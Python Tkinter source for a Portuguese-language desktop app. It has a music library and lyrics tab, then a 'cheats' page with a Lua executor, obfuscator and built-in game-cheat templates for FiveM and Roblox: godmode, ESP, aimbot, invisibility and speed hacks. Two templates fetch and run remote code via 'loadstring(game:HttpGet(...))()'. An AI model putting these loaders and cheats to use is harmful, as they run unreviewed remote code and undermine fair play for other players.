    # ─── BIBLIOTECA TAB ───
    def build_biblioteca_tab(self):
        top = tk.Frame(self.tab_biblioteca, bg=BG)
        top.pack(fill="x", padx=12, pady=12)
        tk.Label(top, text="📚 BIBLIOTECA - Local + YouTube + Favoritos", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(anchor="w")
        tk.Label(top, text="Adiciona músicas locais, gere playlists modernas estilo Spotify", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")

        btn_row = tk.Frame(self.tab_biblioteca, bg=BG)
        btn_row.pack(fill="x", padx=12, pady=8)
        for txt, cmd in [("➕ FICHEIROS", self.add_files), ("📁 PASTA", self.add_folder), ("💾 GUARDAR BIBLIOTECA", self.save_biblioteca), ("🗑 LIMPAR", self.clear_playlist), ("📥 IMPORTAR M3U", self.import_m3u)]:
            b = tk.Button(btn_row, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
            b.pack(side="left", padx=4, fill="x", expand=True)

        self.bib_listbox = tk.Listbox(self.tab_biblioteca, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, selectbackground=ACCENT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.bib_listbox.pack(fill="both", expand=True, padx=12, pady=8)
        self.bib_listbox.bind("<Double-Button-1>", lambda e: self.play_bib_selected())

        btn_row2 = tk.Frame(self.tab_biblioteca, bg=BG)
        btn_row2.pack(fill="x", padx=12, pady=8)
        for txt, cmd in [("▶ TOCAR", self.play_bib_selected), ("❤ FAV", self.toggle_fav_bib), ("🗑 REMOVER", self.remove_bib_selected), ("📋 COPIAR PATH", self.copy_bib_path)]:
            b = tk.Button(btn_row2, text=txt, command=cmd, bg=PANEL_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
            b.pack(side="left", padx=4, fill="x", expand=True)

    def add_files(self):
        files = filedialog.askopenfilenames(filetypes=[("Áudio","*.mp3 *.wav *.ogg *.flac *.m4a *.aac *.wma *.opus"), ("Todos","*.*")])
        if not files:
            return
        for f in files:
            self.playlist.append({
                "id": str(uuid.uuid4()),
                "title": os.path.splitext(os.path.basename(f))[0],
                "artist": "Local",
                "album": os.path.dirname(f).split("/")[-1],
                "file_path": f,
                "url": "",
                "thumb": "",
                "source": "local",
                "fav": False
            })
        self.refresh_listbox()
        self.save_biblioteca()

    def add_folder(self):
        folder = filedialog.askdirectory()
        if not folder:
            return
        for root, dirs, files in os.walk(folder):
            for name in files:
                if name.lower().endswith(self.SUPPORTED_EXTS):
                    full = os.path.join(root, name)
                    self.playlist.append({
                        "id": str(uuid.uuid4()),
                        "title": os.path.splitext(name)[0],
                        "artist": "Local",
                        "album": root.split("/")[-1],
                        "file_path": full,
                        "url": "",
                        "thumb": "",
                        "source": "local",
                        "fav": False
                    })
        self.refresh_listbox()
        self.save_biblioteca()

    def import_m3u(self):
        path = filedialog.askopenfilename(filetypes=[("M3U","*.m3u *.m3u8")])
        if not path:
            return
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line=line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if os.path.exists(line) or line.startswith("http"):
                        self.playlist.append({
                            "id": str(uuid.uuid4()),
                            "title": os.path.basename(line),
                            "artist": "M3U",
                            "album": "",
                            "file_path": line if os.path.exists(line) else "",
                            "url": line if line.startswith("http") else "",
                            "thumb": "",
                            "source": "m3u",
                            "fav": False
                        })
            self.refresh_listbox()
            self.save_biblioteca()
        except Exception as e:
            messagebox.showerror("M3U", str(e))

    def play_bib_selected(self):
        sel = self.bib_listbox.curselection()
        if not sel:
            sel = self.listbox.curselection()
            if sel:
                self.current_index = sel[0]
                self.play_track()
            return
        # Sync listbox
        self.listbox.selection_clear(0,"end")
        self.listbox.selection_set(sel[0])
        self.current_index = sel[0]
        self.play_track()

    def remove_bib_selected(self):
        sel = self.listbox.curselection()
        if not sel:
            return
        for idx in sorted(sel, reverse=True):
            del self.playlist[idx]
        self.refresh_listbox()
        self.save_biblioteca()

    def toggle_fav_bib(self):
        sel = self.listbox.curselection()
        if not sel:
            return
        for idx in sel:
            self.playlist[idx]["fav"] = not self.playlist[idx].get("fav", False)
        self.refresh_listbox()
        self.save_biblioteca()

    def copy_bib_path(self):
        sel = self.listbox.curselection()
        if not sel:
            return
        item = self.playlist[sel[0]]
        path = item.get("file_path") or item.get("url") or ""
        self.clipboard_clear()
        self.clipboard_append(path)

    def load_biblioteca(self):
        music_file = os.path.join(BASE_DIR, "music.json")
        data = load_json(music_file, [])
        if data:
            self.playlist = data
            self.refresh_listbox()

    def save_biblioteca(self):
        music_file = os.path.join(BASE_DIR, "music.json")
        save_json(music_file, self.playlist)

    # ─── LYRICS TAB ───
    def build_lyrics_tab(self):
        top = tk.Frame(self.tab_lyrics, bg=BG)
        top.pack(fill="x", padx=12, pady=12)
        tk.Label(top, text="📝 LYRICS - Letras automáticas via API", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(anchor="w")
        tk.Label(top, text="Busca letras via lyrics.ovh API - grátis", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")

        search_row = tk.Frame(self.tab_lyrics, bg=BG)
        search_row.pack(fill="x", padx=12, pady=8)
        tk.Label(search_row, text="Artista:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.lyrics_artist = tk.Entry(search_row, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=20)
        self.lyrics_artist.pack(side="left", padx=6, ipady=4)
        tk.Label(search_row, text="Música:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left", padx=(12,0))
        self.lyrics_title = tk.Entry(search_row, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=20)
        self.lyrics_title.pack(side="left", padx=6, ipady=4, fill="x", expand=True)
        tk.Button(search_row, text="🔍 BUSCAR LYRICS", command=self.fetch_lyrics_manual, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=10, pady=4).pack(side="left", padx=6)

        self.lyrics_out = scrolledtext.ScrolledText(self.tab_lyrics, font=(FONT_MONO, 11), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="word")
        self.lyrics_out.pack(fill="both", expand=True, padx=12, pady=12)
        self.lyrics_out.insert("1.0", "Lyrics pronto. Selecione música no player e clique 📝 LYRICS ou busque aqui.\\n\\nAPI: https://api.lyrics.ovh\\n")

    def fetch_lyrics_current(self):
        if self.current_index>=0 and self.current_index < len(self.playlist):
            item = self.playlist[self.current_index]
            self.fetch_lyrics(item.get("title",""), item.get("artist",""))

    def fetch_lyrics_manual(self):
        artist = self.lyrics_artist.get().strip()
        title = self.lyrics_title.get().strip()
        if not artist or not title:
            messagebox.showwarning("Lyrics","Artista e música obrigatórios")
            return
        self.fetch_lyrics(title, artist)

    def fetch_lyrics(self, title, artist):
        # Limpa titulo para busca
        clean_title = title.split("(")[0].split("[")[0].strip()
        clean_artist = artist.split("(")[0].strip() or "Unknown"
        self.lyrics_out.delete("1.0","end")
        self.lyrics_out.insert("1.0", f"Buscando lyrics: {clean_artist} - {clean_title}...\\nVia lyrics.ovh API...\\n\\n")
        self.lyrics_artist.delete(0,"end")
        self.lyrics_artist.insert(0, clean_artist)
        self.lyrics_title.delete(0,"end")
        self.lyrics_title.insert(0, clean_title)
        threading.Thread(target=self.lyrics_worker, args=(clean_artist, clean_title), daemon=True).start()

    def lyrics_worker(self, artist, title):
        try:
            import urllib.request, json
            url = "https://api.lyrics.ovh/v1/" + urllib.parse.quote(artist) + "/" + urllib.parse.quote(title)
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read().decode())
                lyrics = data.get("lyrics","")
                if lyrics:
                    def update():
                        self.lyrics_out.delete("1.0","end")
                        self.lyrics_out.insert("1.0", f"{artist} - {title}\\n\\n{lyrics}")
                    self.after(0, update)
                else:
                    self.after(0, lambda: self.lyrics_out.insert("end", "\\n❌ Lyrics não encontradas\\nTenta artista/título mais simples\\n"))
        except Exception as e:
            self.after(0, lambda: self.lyrics_out.insert("end", f"\\n❌ Erro: {e}\\nAPI lyrics.ovh pode estar offline\\n"))




class CheatsPage(Page):
    """CHEATS // LUA EXECUTOR FIVEM + ROBLOX + GERADOR - ATUALIZADO 2026"""
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.header("CHEATS // LABORATÓRIO ÉTICO + LUA EXECUTOR", "FiveM • Roblox • Geral • Executor • Obfuscator — uso educativo / offline")
        tk.Label(
            self,
            text="AVISO: Apenas para estudo, single-player e servidores próprios. Não uses em servidores alheios sem permissão.",
            bg=BG,
            fg="#ffb700",
            font=(FONT_MONO, 7, "bold")).pack(anchor="w", padx=34, pady=(0, 8))

        style = ttk.Style()
        style.theme_use("default")
        style.configure("TNotebook", background=BG, borderwidth=0)
        style.configure(
            "TNotebook.Tab",
            background=BTN_BG,
            foreground=TEXT_DIM,
            padding=[12, 6],
            font=(FONT_MONO, 8, "bold"),
            borderwidth=0)
        style.map("TNotebook.Tab", background=[("selected", ACCENT_DIM)], foreground=[("selected", ACCENT)])

        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=20, pady=(0, 10))

        # ── TABS ──
        tab_codes = tk.Frame(nb, bg=BG)
        tab_lua = tk.Frame(nb, bg=BG)
        tab_fivem = tk.Frame(nb, bg=BG)
        tab_roblox = tk.Frame(nb, bg=BG)
        tab_tools = tk.Frame(nb, bg=BG)

        nb.add(tab_lua, text=" 💉 LUA EXECUTOR ")
        nb.add(tab_fivem, text=" 🟢 FIVEM ")
        nb.add(tab_roblox, text=" 🟥 ROBLOX ")
        nb.add(tab_codes, text=" CHEAT CODES ")
        nb.add(tab_tools, text=" DEBUG LOCAL ")

        # ============================================================
        # TAB 1 - CHEAT CODES (original mantido)
        # ============================================================
        top_search = tk.Frame(tab_codes, bg=BG)
        top_search.pack(fill="x", padx=10, pady=10)
        tk.Label(top_search, text="JOGO:", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left")
        self.game_entry = tk.Entry(
            top_search,
            font=(FONT_MONO, 11),
            bg=PANEL_BG,
            fg=TEXT,
            insertbackground=ACCENT,
            relief="flat",
            highlightthickness=1,
            highlightbackground=ACCENT_DIM,
            width=30)
        self.game_entry.pack(side="left", padx=10, ipady=5)
        self.game_entry.insert(0, "GTA V")

        btn_frame = tk.Frame(tab_codes, bg=BG)
        btn_frame.pack(fill="x", padx=10)

        def btn_site(txt, url):
            b = tk.Button(btn_frame, text=txt, command=lambda u=url: self.abrir_com_jogo(u))
            b.pack(side="left", padx=4, pady=4, ipady=6)
            style_button(b)
            b.configure(font=(FONT_MONO, 7, "bold"))

        btn_site("CheatCC", "https://www.cheatcc.com/search?q=")
        btn_site("GameFAQs", "https://gamefaqs.gamespot.com/search?game=")
        btn_site("IGN Cheats", "https://www.ign.com/search?q=")
        btn_site("ScriptBlox", "https://scriptblox.com/search?q=")
        btn_site("Cheat Engine Forum", "https://forum.cheatengine.org/search.php?q=")

        tk.Label(tab_codes, text="Dica: Usa o Lua Executor para testar os códigos antes de injetar.", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", padx=10, pady=8)

        # ============================================================
        # TAB 2 - LUA EXECUTOR (GERAL)
        # ============================================================
        self.lua_target_var = tk.StringVar(value="Geral")
        self.lua_status_var = tk.StringVar(value="Pronto — sem processo anexado")
        self.lua_scripts_file = os.path.join(BASE_DIR, "lua_scripts.json")
        self.lua_scripts = self._load_lua_scripts()

        top_lua = tk.Frame(tab_lua, bg=BG)
        top_lua.pack(fill="x", padx=10, pady=(8,4))
        tk.Label(top_lua, text="TARGET:", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left")
        target_combo = ttk.Combobox(top_lua, textvariable=self.lua_target_var, values=["Geral", "FiveM", "Roblox", "Garry's Mod", "SA-MP", "Minecraft/LuaJ", "RedM"], width=14, state="readonly", font=(FONT_MONO, 9))
        target_combo.pack(side="left", padx=6)
        target_combo.bind("<<ComboboxSelected>>", lambda e: self._on_target_change())

        tk.Label(top_lua, text="STATUS:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left", padx=(15,4))
        tk.Label(top_lua, textvariable=self.lua_status_var, bg=BG, fg="#00ff88", font=(FONT_MONO, 8, "bold")).pack(side="left")

        # Split: left editor + right script hub
        mid = tk.Frame(tab_lua, bg=BG)
        mid.pack(fill="both", expand=True, padx=10, pady=4)

        left_editor = tk.Frame(mid, bg=BG)
        left_editor.pack(side="left", fill="both", expand=True, padx=(0,6))

        tk.Label(left_editor, text="EDITOR LUA (Monaco-like)", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w")
        self.lua_editor = scrolledtext.ScrolledText(left_editor, height=20, font=(FONT_MONO, 11), bg="#0a121a", fg="#d8f8ff", insertbackground=ACCENT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="none", undo=True)
        self.lua_editor.pack(fill="both", expand=True, pady=(4,4))
        self.lua_editor.insert("1.0", self._get_default_lua_code("Geral"))

        # Console output
        tk.Label(left_editor, text="CONSOLE / OUTPUT", bg=BG, fg="#ffb700", font=(FONT_MONO, 8, "bold")).pack(anchor="w", pady=(4,2))
        self.lua_console = scrolledtext.ScrolledText(left_editor, height=8, font=(FONT_MONO, 9), bg=PANEL_BG, fg="#aaffaa", relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="word")
        self.lua_console.pack(fill="both", expand=False, pady=(0,4))
        self.lua_console.insert("1.0", "[Executor] Pronto. Escreve Lua e clica Executar.\n[Info] Se tiver Lua instalado, executa real. Senão faz syntax-check.\n")

        # Botões executor
        btns_lua = tk.Frame(left_editor, bg=BG)
        btns_lua.pack(fill="x", pady=2)
        for txt, cmd, color in [
            ("▶ EXECUTAR", self.lua_executar, ACCENT),
            ("💉 INJETAR", self.lua_injetar, "#00ff88"),
            ("📎 ATTACH", self.lua_attach, "#ffb700"),
            ("🧹 LIMPAR", self.lua_limpar, TEXT_DIM),
            ("💾 GUARDAR", self.lua_guardar_script, TEXT),
            ("📂 ABRIR .LUA", self.lua_abrir_ficheiro, TEXT),
        ]:
            b = tk.Button(btns_lua, text=txt, command=cmd, width=11, font=(FONT_MONO, 8, "bold"))
            b.pack(side="left", padx=2, ipady=5)
            style_button(b)
            if color != TEXT and color != TEXT_DIM:
                b.configure(fg=color)

        btns_lua2 = tk.Frame(left_editor, bg=BG)
        btns_lua2.pack(fill="x", pady=2)
        for txt, cmd in [
            ("🔒 OBFUSCAR", self.lua_obfuscate),
            ("🔓 DEOBFUSCAR", self.lua_deobfuscate),
            ("📦 MINIFY", self.lua_minify),
            ("🧠 BEAUTIFY", self.lua_beautify),
            ("✔ CHECK SYNTAX", self.lua_check_syntax),
            ("🔍 EXPLICAR", self.lua_explicar),
        ]:
            b = tk.Button(btns_lua2, text=txt, command=cmd, font=(FONT_MONO, 7, "bold"))
            b.pack(side="left", padx=2, ipady=4, fill="x", expand=True)
            style_button(b)

        # Right - Script Hub
        right_hub = tk.Frame(mid, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM, width=260)
        right_hub.pack(side="right", fill="y", padx=(6,0))
        right_hub.pack_propagate(False)
        tk.Label(right_hub, text="SCRIPT HUB", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(anchor="w", padx=10, pady=(10,4))
        tk.Label(right_hub, text="Templates por target", bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7)).pack(anchor="w", padx=10)

        self.lua_hub_list = tk.Listbox(right_hub, bg="#0a121a", fg=TEXT, font=(FONT_MONO, 9), relief="flat", highlightthickness=0, selectbackground=ACCENT_DIM, selectforeground=ACCENT)
        self.lua_hub_list.pack(fill="both", expand=True, padx=8, pady=8)
        self.lua_hub_list.bind("<Double-Button-1>", lambda e: self._load_hub_selection())

        hub_btns = tk.Frame(right_hub, bg=PANEL_BG)
        hub_btns.pack(fill="x", padx=8, pady=(0,8))
        b_load = tk.Button(hub_btns, text="CARREGAR", command=self._load_hub_selection)
        b_load.pack(side="left", fill="x", expand=True, padx=2, ipady=4)
        style_button(b_load)
        b_del = tk.Button(hub_btns, text="APAGAR", command=self._delete_hub_script)
        b_del.pack(side="left", fill="x", expand=True, padx=2, ipady=4)
        style_button(b_del)

        self._refresh_hub_list()

        # ============================================================
        # TAB 3 - FIVEM
        # ============================================================
        self._build_fivem_tab(tab_fivem)

        # ============================================================
        # TAB 4 - ROBLOX
        # ============================================================
        self._build_roblox_tab(tab_roblox)

        # ============================================================
        # TAB 5 - DEBUG LOCAL (mantido e melhorado)
        # ============================================================
        tk.Label(tab_tools, text="FERRAMENTAS PARA JOGOS OFFLINE / DEBUG", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(
            anchor="w", padx=10, pady=(10,4)
        )
        tk.Label(tab_tools, text="Cheat Engine, WeMod, Process Hacker, x64dbg - para analise local single-player", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", padx=10, pady=(0,10))
        tools_grid = tk.Frame(tab_tools, bg=BG)
        tools_grid.pack(fill="x", padx=10, pady=4)
        for title, url, desc in [
            ("Cheat Engine", "https://www.cheatengine.org/", "Memory scanner / debugger local"),
            ("WeMod", "https://www.wemod.com/", "Trainers single-player"),
            ("Process Hacker", "https://processhacker.sourceforge.io/", "Ver processos, handles, memoria"),
            ("x64dbg", "https://x64dbg.com/", "Debugger open-source"),
            ("Lua 5.4 Docs", "https://www.lua.org/manual/5.4/", "Documentacao oficial Lua"),
            ("FiveM Docs", "https://docs.fivem.net/docs/", "Docs natives FiveM"),
            ("Roblox Creator Docs", "https://create.roblox.com/docs", "Docs Roblox Lua"),
            ("Lupa (Python-Lua)", "https://github.com/scoder/lupa", "Bridge Python-Lua"),
        ]:
            row = tk.Frame(tools_grid, bg=PANEL_BG, highlightthickness=1, highlightbackground=ACCENT_DIM)
            row.pack(fill="x", pady=3)
            left = tk.Frame(row, bg=PANEL_BG)
            left.pack(side="left", fill="x", expand=True, padx=10, pady=8)
            tk.Label(left, text=title, bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(anchor="w")
            tk.Label(left, text=desc, bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7)).pack(anchor="w")
            b = tk.Button(row, text="ABRIR", command=lambda u=url: webbrowser.open(u))
            b.pack(side="right", padx=10)
            style_button(b)

    # ===================== FUNCOES AUXILIARES LUA =====================
    def abrir_com_jogo(self, base_url):
        jogo = self.game_entry.get().strip()
        webbrowser.open(base_url + urllib.parse.quote(jogo))

    def _load_lua_scripts(self):
        try:
            if os.path.exists(self.lua_scripts_file):
                with open(self.lua_scripts_file, "r", encoding="utf-8") as f:
                    return json.load(f)
        except:
            pass
        return []

    def _save_lua_scripts(self):
        try:
            with open(self.lua_scripts_file, "w", encoding="utf-8") as f:
                json.dump(self.lua_scripts, f, indent=2, ensure_ascii=False)
        except:
            pass

    def _get_default_lua_code(self, target):
        templates = {
            "Geral": '-- Lua Executor Geral // AIRES\n-- Testa logica pura Lua 5.4\nprint("Ola do Lua Executor AIRES!")\n\nlocal player = {name="Aires", level=99}\nfunction GetPlayer() return player end\n\nfor i=1,5 do\n  print("Tick "..i.." - Player: "..GetPlayer().name)\nend\n',
            "FiveM": '-- FiveM Client Script // ESX / QBCore\n-- Coloca em resource client.lua\n-- fxmanifest: client_script \'client.lua\'\n\nlocal godmode = false\nlocal noclip = false\nlocal infiniteStamina = true\n\nRegisterCommand("aires_god", function()\n    godmode = not godmode\n    local ped = PlayerPedId()\n    SetEntityInvincible(ped, godmode)\n    TriggerEvent("chat:addMessage", {args={"[Aires] Godmode: "..tostring(godmode)}})\nend, false)\n\nRegisterCommand("aires_noclip", function()\n    noclip = not noclip\n    local ped = PlayerPedId()\n    FreezeEntityPosition(ped, noclip)\n    print("[Aires] NoClip "..tostring(noclip))\nend)\n\n-- Loop stamina infinita\nCreateThread(function()\n  while true do\n    Wait(0)\n    if infiniteStamina then\n      RestorePlayerStamina(PlayerId(), 1.0)\n    end\n  end\nend)\n\n-- Spawn Vehicle\nRegisterCommand("aires_car", function(src, args)\n  local model = args[1] or "adder"\n  local hash = GetHashKey(model)\n  RequestModel(hash)\n  while not HasModelLoaded(hash) do Wait(10) end\n  local ped = PlayerPedId()\n  local coords = GetEntityCoords(ped)\n  local veh = CreateVehicle(hash, coords.x+2, coords.y+2, coords.z, 90.0, true, false)\n  SetPedIntoVehicle(ped, veh, -1)\nend)\n',
            "Roblox": '-- Roblox Lua // Executor - LocalScript exemplo\n-- Testado estilo Synapse / Fluxus / Krampus\n-- Apenas no teu jogo / Studio\n\nlocal Players = game:GetService("Players")\nlocal LocalPlayer = Players.LocalPlayer\nlocal UserInputService = game:GetService("UserInputService")\n\n-- Fly simples\nlocal flying = false\nlocal speed = 50\n\nfunction ToggleFly()\n    flying = not flying\n    print("[Aires Fly] "..tostring(flying))\nend\n\nUserInputService.InputBegan:Connect(function(input, gpe)\n    if gpe then return end\n    if input.KeyCode == Enum.KeyCode.F then\n        ToggleFly()\n    end\nend)\n\n-- Speed hack (local)\nLocalPlayer.Character.Humanoid.WalkSpeed = 32\nprint("[Aires] WalkSpeed setado para 32")\n\n-- ESP simples (Highlight)\nfor _, plr in pairs(Players:GetPlayers()) do\n    if plr ~= LocalPlayer and plr.Character then\n        local hl = Instance.new("Highlight")\n        hl.Parent = plr.Character\n        hl.FillColor = Color3.fromRGB(0, 229, 255)\n    end\nend\n',
            "Garry's Mod": '-- Garry Mod Lua // Client\nprint("[Aires] GMod Executor Loaded")\nconcommand.Add("aires_god", function() RunConsoleCommand("god") end)\nconcommand.Add("aires_noclip", function() RunConsoleCommand("noclip") end)\n\n-- ESP\nhook.Add("HUDPaint", "AiresESP", function()\n  for _, ply in ipairs(player.GetAll()) do\n    if ply ~= LocalPlayer() then\n      local pos = ply:GetPos():ToScreen()\n      draw.SimpleText(ply:Nick(), "DermaDefault", pos.x, pos.y, Color(0,229,255))\n    end\n  end\nend)\n',
            "SA-MP": '-- SA-MP / open.mp Lua (ex: usando MoonLoader estilo)\n-- Apenas offline / teu servidor\nfunction main()\n  print("[Aires] SA-MP Lua Loaded")\n  while true do\n    wait(0)\n    if isKeyDown(0x47) then -- G\n      setCharHealth(PLAYER_PED, 1000)\n      printString("Godmode", 1000)\n    end\n  end\nend\n',
            "Minecraft/LuaJ": '-- ComputerCraft / OpenComputers Lua\nprint("Aires Miner")\nfor i=1,10 do\n  turtle.dig()\n  turtle.forward()\nend\n',
            "RedM": '-- RedM // Red Dead Online - Client\nRegisterCommand("aires_god", function()\n  SetEntityInvincible(PlayerPedId(), true)\n  print("Godmode ON")\nend)\n'
        }
        return templates.get(target, templates["Geral"])

    def _on_target_change(self):
        target = self.lua_target_var.get()
        current = self.lua_editor.get("1.0","end-1c").strip()
        if len(current) < 30 or "Aires" in current[:100]:
            self.lua_editor.delete("1.0","end")
            self.lua_editor.insert("1.0", self._get_default_lua_code(target))
        self._refresh_hub_list()
        self.lua_console.insert("end", f"\n[Target] Mudado para {target}\n")
        self.lua_console.see("end")

    def _refresh_hub_list(self):
        self.lua_hub_list.delete(0,"end")
        target = self.lua_target_var.get()
        builtins = {
            "Geral": ["Hello World", "Loop Test", "Function Test", "Obfuscator Demo"],
            "FiveM": ["ESX Godmode", "QBCore NoClip", "Infinite Stamina", "Spawn Car (adder)", "Teleport Waypoint", "Invisible", "Super Jump", "No Ragdoll"],
            "Roblox": ["Infinite Yield FE", "Fly V3", "ESP Highlight", "Speed 100", "Infinite Jump", "NoClip", "Aimbot Basic", "FullBright"],
            "Garry's Mod": ["God + Noclip", "ESP GMod", "Speedhack"],
            "SA-MP": ["Godmode SA-MP", "Car Spawn"],
            "Minecraft/LuaJ": ["Miner Turtle", "Farm Bot"],
            "RedM": ["Godmode RedM"]
        }
        for name in builtins.get(target, builtins["Geral"]):
            self.lua_hub_list.insert("end", f"📦 {name}")
        for s in self.lua_scripts:
            if s.get("target")==target or target=="Geral":
                self.lua_hub_list.insert("end", f"💾 {s.get('name')} ({s.get('target')})")

    def _load_hub_selection(self):
        sel = self.lua_hub_list.curselection()
        if not sel:
            return
        txt = self.lua_hub_list.get(sel[0])
        name = txt[2:].split(" (")[0].strip()

        for s in self.lua_scripts:
            if s.get("name")==name:
                self.lua_editor.delete("1.0","end")
                self.lua_editor.insert("1.0", s.get("code",""))
                self.lua_target_var.set(s.get("target","Geral"))
                self.lua_console.insert("end", f"\n[Hub] Carregado: {name}\n")
                self.lua_console.see("end")
                return

        samples = {
            "Hello World": 'print("Hello World - AIRES")',
            "ESX Godmode": 'RegisterCommand("aires_god", function()\n    local ped = PlayerPedId()\n    SetEntityInvincible(ped, true)\n    print("Godmode ON")\nend)',
            "QBCore NoClip": '-- QBCore NoClip avancado\nlocal noclip = false\nRegisterCommand("noclip", function()\n  noclip = not noclip\n  local ped = PlayerPedId()\n  SetEntityInvincible(ped, noclip)\n  FreezeEntityPosition(ped, false)\n  print("NoClip: "..tostring(noclip))\nend)',
            "Infinite Stamina": 'CreateThread(function() while true do Wait(0) RestorePlayerStamina(PlayerId(), 1.0) end end)',
            "Spawn Car (adder)": 'RegisterCommand("car", function(_, args) local m=args[1] or "adder" RequestModel(GetHashKey(m)) while not HasModelLoaded(GetHashKey(m)) do Wait(0) end local c=GetEntityCoords(PlayerPedId()) local v=CreateVehicle(GetHashKey(m), c.x+2,c.y+2,c.z, 90.0, true,false) SetPedIntoVehicle(PlayerPedId(), v, -1) end)',
            "Teleport Waypoint": 'RegisterCommand("tpway", function() local wp = GetFirstBlipInfoId(8) if DoesBlipExist(wp) then local coord = GetBlipCoords(wp) SetEntityCoords(PlayerPedId(), coord.x, coord.y, coord.z) end end)',
            "Invisible": 'RegisterCommand("invis", function() NetworkSetEntityInvisibleToNetwork(PlayerPedId(), true) SetEntityVisible(PlayerPedId(), false, false) end)',
            "Super Jump": 'RegisterCommand("superjump", function() SetSuperJumpThisFrame(PlayerId()) end)',
            "No Ragdoll": 'CreateThread(function() while true do Wait(0) SetPedCanRagdollFromPlayerImpact(PlayerPedId(), false) end end)',
            "Infinite Yield FE": '-- Load Infinite Yield\nloadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()',
            "Fly V3": '-- Fly V3 simples\nloadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()',
            "ESP Highlight": 'for _,p in pairs(game.Players:GetPlayers()) do if p~=game.Players.LocalPlayer and p.Character then Instance.new("Highlight", p.Character).FillColor=Color3.new(0,1,1) end end',
            "Speed 100": 'game.Players.LocalPlayer.Character.Humanoid.WalkSpeed=100',
            "Infinite Jump": 'game:GetService("UserInputService").JumpRequest:Connect(function() game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping") end)',
            "NoClip": '-- Roblox NoClip\nlocal noclip=false\ngame:GetService("RunService").Stepped:Connect(function() if noclip then for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide=false end end end end)',
            "Aimbot Basic": '-- Aimbot basico educativo\nlocal Players=game:GetService("Players")\nlocal function GetClosest() local closest, dist=nil, math.huge for _,p in pairs(Players:GetPlayers()) do if p~=Players.LocalPlayer and p.Character and p.Character:FindFirstChild("Head") then local d=(p.Character.Head.Position-Players.LocalPlayer.Character.Head.Position).Magnitude if d<dist then closest, dist=p, d end end end return closest end\nprint("Closest: "..tostring(GetClosest()))',
            "FullBright": 'game.Lighting.Brightness=2 game.Lighting.ClockTime=14 game.Lighting.FogEnd=100000',
            "God + Noclip": 'concommand.Add("aires_god", function() RunConsoleCommand("god") end)\nconcommand.Add("aires_noclip", function() RunConsoleCommand("noclip") end)',
            "ESP GMod": 'hook.Add("HUDPaint","ESP", function() for _,ply in ipairs(player.GetAll()) do if ply~=LocalPlayer() then local p=ply:GetPos():ToScreen() draw.SimpleText(ply:Nick(),"DermaDefault",p.x,p.y,Color(0,255,255)) end end end)',
            "Godmode SA-MP": 'function main() while true do wait(0) if isKeyDown(0x47) then setCharHealth(PLAYER_PED, 1000) end end end',
            "Car Spawn": 'function main() if isKeyDown(0x43) then local x,y,z=getCharCoordinates(PLAYER_PED) createCar(411,x+2,y,z) end wait(0) end',
            "Miner Turtle": 'for i=1,10 do turtle.dig() turtle.forward() end',
            "Farm Bot": 'while true do turtle.select(1) turtle.placeDown() turtle.forward() end',
            "Godmode RedM": 'RegisterCommand("god", function() SetEntityInvincible(PlayerPedId(), true) end)'
        }
        code = samples.get(name)
        if not code:
            code = self._get_default_lua_code(self.lua_target_var.get())
        self.lua_editor.delete("1.0","end")
        self.lua_editor.insert("1.0", code)
        self.lua_console.insert("end", f"\n[Hub] Template {name} carregado\n")
        self.lua_console.see("end")

    def _delete_hub_script(self):
        sel = self.lua_hub_list.curselection()
        if not sel:
            return
        txt = self.lua_hub_list.get(sel[0])
        if not txt.startswith("💾"):
            messagebox.showinfo("Info", "So podes apagar scripts guardados (💾)")
            return
        name = txt[2:].split(" (")[0].strip()
